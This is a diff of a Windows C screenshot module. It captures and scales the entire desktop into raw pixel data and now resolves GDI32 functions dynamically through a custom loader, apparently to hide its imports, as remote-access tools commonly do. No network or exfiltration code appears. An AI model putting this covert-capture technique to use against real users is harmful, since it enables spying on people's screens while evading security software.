@@ -1,126 +1,150 @@
 #include <stdlib.h>
+#include <string.h>
 #include <windows.h>
 #include "types.h"
 #include "screenshot.h"
+#include "loadLibrary.h"
 
-HDC screenshot_backBuff;
+HDC snc_backBuff;
+HMODULE snc_lib;
+__SelectObject snc_SelectObject;
+__CreateCompatibleDC snc_CreateCompatibleDC;
+__CreateCompatibleBitmap snc_CreateCompatibleBitmap;
+__SetStretchBltMode snc_SetStretchBltMode;
+__StretchBlt snc_StretchBlt;
+__GetDIBits snc_GetDIBits;
+__DeleteObject snc_DeleteObject;
+__DeleteDC snc_DeleteDC;
 
 void screenshot_Init(void)
 {
-	screenshot_backBuff = GetDC(GetDesktopWindow());
+	snc_lib = loadLibrary_Load(lib_Gdi32);
+	snc_backBuff = GetDC(GetDesktopWindow());
+
+	if(snc_lib)
+	{
+		snc_SelectObject = (__SelectObject)loadLibrary_LoadFunc(snc_lib, lib_SelectObject);
+		snc_CreateCompatibleDC = (__CreateCompatibleDC)loadLibrary_LoadFunc(snc_lib, lib_CreateCompatibleDC);
+		snc_CreateCompatibleBitmap = (__CreateCompatibleBitmap)loadLibrary_LoadFunc(snc_lib, lib_CreateCompatibleBitmap);
+		snc_SetStretchBltMode = (__SetStretchBltMode)loadLibrary_LoadFunc(snc_lib, lib_SetStretchBltMode);
+		snc_StretchBlt = (__StretchBlt)loadLibrary_LoadFunc(snc_lib, lib_StretchBlt);
+		snc_GetDIBits = (__GetDIBits)loadLibrary_LoadFunc(snc_lib, lib_GetDIBits);
+		snc_DeleteObject = (__DeleteObject)loadLibrary_LoadFunc(snc_lib, lib_DeleteObject);
+		snc_DeleteDC = (__DeleteDC)loadLibrary_LoadFunc(snc_lib, lib_DeleteDC);
+	}
 }
 
-void screenshot_Calculate(double mX, double mY, OUT_INT width, OUT_INT height)
+uint32 screenshot_Calculate(OUT_UINT scW, OUT_UINT scH, uint32 perW, uint32 perH)
 {
-	if(mX <= 1 || mY <= 1)
+	if(!snc_backBuff || !snc_lib)
 	{
-		if(mX <= 1)
+		return 0;
+	}
+
+	if(perW < 1 || perH < 1)
+	{
+		if(perW < 1)
 		{
-			mX = 10;
+			perW = 100;
 		}
 
-		if(mY <= 1)
+		if(perH < 1)
 		{
-			mY = 10;
+			perH = 100;
 		}
 	}
 
-	int _scWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-	int _scHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-
-	int scWidth = (int)((double)_scWidth * (mX / 100.0));
-	int scHeight = (int)((double)_scHeight * (mY / 100.0));
+	if(perW > 100 || perH > 100)
+	{
+		if(perW > 100)
+		{
+			perW = 100;
+		}
 	
-	*width = scWidth;
-	*height = scHeight;
+		if(perH > 100)
+		{
+			perH = 100;
+		}
+	}
+
+	int _w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+	int _h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+	if(!_w || !_h)
+	{
+		return 0;
+	}
+
+	*scW = (int)((double)_w * ((double)perW / 100.0));
+	*scH = (int)((double)_h * ((double)perH / 100.0));
+
+	return *scW * *scH * 3;
 }
 
-//from RGB to RG
-void screenshot_CompressData(OUT_USTRP data, OUT_UINT dataLen, int width, int height)
+uint32 screenshot_Take(uint32 perW, uint32 perH, OUT_USTRP data)
 {
-	int ndataLen = (height * (width * 2)) + sizeof(uint8);
-	uint32 ndataIndex = 0;
-	uint32 odataIndex = 0;
-	uint8* ndata = malloc(ndataLen);
-	uint8* odata = *data;
-	memset(ndata, 0, ndataLen);
-
-	int mx;
-	int my;
-
-	for(my = 0; my != height; my++)
+	if(!snc_backBuff || !snc_lib)
 	{
-		for(mx = 0; mx != width; mx++)
-		{
-			ndata[ndataIndex++] = odata[odataIndex++];
-			ndata[ndataIndex++] = odata[odataIndex++];
-			odataIndex++;
-		}
+		return 0;
 	}
-
-	free(odata);
-	*data = ndata;
-	*dataLen = ndataLen - 1;
-}
-
-uint8* screenshot_Take(double mX, double mY, OUT_INT width, OUT_INT height)
-{
-	if(mX <= 1 || mY <= 1)
-	{
-		if(mX <= 1)
-		{
-			mX = 10;
-		}
-
-		if(mY <= 1)
-		{
-			mY = 10;
-		}
-	}
-
-	if(!screenshot_backBuff)
-	{
-		*width = 0;
-		*height = 0;
-
-		return NULL;
-	}
-
-	int _scWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-	int _scHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-
-	int scWidth = (int)((double)_scWidth * (mX / 100.0));
-	int scHeight = (int)((double)_scHeight * (mY / 100.0));
 	
-	*width = scWidth;
-	*height = scHeight;
+	uint32 scW;
+	uint32 scH;
+	uint32 size;
 
-	HDC frontBuff = CreateCompatibleDC(screenshot_backBuff);
-	HBITMAP backBM = CreateCompatibleBitmap(screenshot_backBuff, scWidth, scHeight);
-	HBITMAP oldBackBM = (HBITMAP)SelectObject(frontBuff, backBM);
-	SetStretchBltMode(frontBuff, HALFTONE);
-	StretchBlt(frontBuff, 0, 0, scWidth, scHeight, screenshot_backBuff, 0, 0, _scWidth, _scHeight, SRCCOPY);
+	if(!(size = screenshot_Calculate(&scW, &scH, perW, perH)))
+	{
+		return 0;
+	}
+
+	uint32 orgW = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+	uint32 orgH = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+	HDC frontBuff = snc_CreateCompatibleDC(snc_backBuff);
+	HBITMAP backBM = snc_CreateCompatibleBitmap(snc_backBuff, scW, scH);
+	HBITMAP oldBackBM = (HBITMAP)snc_SelectObject(frontBuff, backBM);
+	
+	if(!snc_SetStretchBltMode(frontBuff, HALFTONE))
+	{
+		snc_DeleteObject(backBM);
+		snc_DeleteObject(oldBackBM);
+		snc_DeleteDC(frontBuff);
+
+		return 0;
+	}
+	
+	if(!snc_StretchBlt(frontBuff, 0, 0, scW, scH, snc_backBuff, 0, 0, orgW, orgH, SRCCOPY))
+	{
+		snc_DeleteObject(backBM);
+		snc_DeleteObject(oldBackBM);
+		snc_DeleteDC(frontBuff);
+		
+		return 0;
+	}
 
 	BITMAPINFOHEADER bmpInfoHeader = { sizeof(BITMAPINFOHEADER) };
-	bmpInfoHeader.biWidth = scWidth;
-	bmpInfoHeader.biHeight = scHeight;
+	bmpInfoHeader.biWidth = scW;
+	bmpInfoHeader.biHeight = scH;
 	bmpInfoHeader.biPlanes = 1;
 	bmpInfoHeader.biBitCount = 24;
 
-	uint8* rdata = malloc((scWidth * scHeight * 3) + sizeof(uint8));
-	int rv = GetDIBits(screenshot_backBuff, backBM, 0, scHeight, rdata, (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);
+	uint8* rdata = malloc(size + 1);
+	memset(rdata, 0, size + 1);
 
-	DeleteObject(backBM);
-	DeleteObject(oldBackBM);
-	DeleteDC(frontBuff);
+	int rv = snc_GetDIBits(snc_backBuff, backBM, 0, scH, rdata, (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);
 
-	if(rv != scHeight)
+	snc_DeleteObject(backBM);
+	snc_DeleteObject(oldBackBM);
+	snc_DeleteDC(frontBuff);
+
+	if(rv != scH)
 	{
 		free(rdata);
 
-		return NULL;
+		return 0;
 	}
 
-	return rdata;
-}
+	*data = rdata;
 
+	return size;
+}
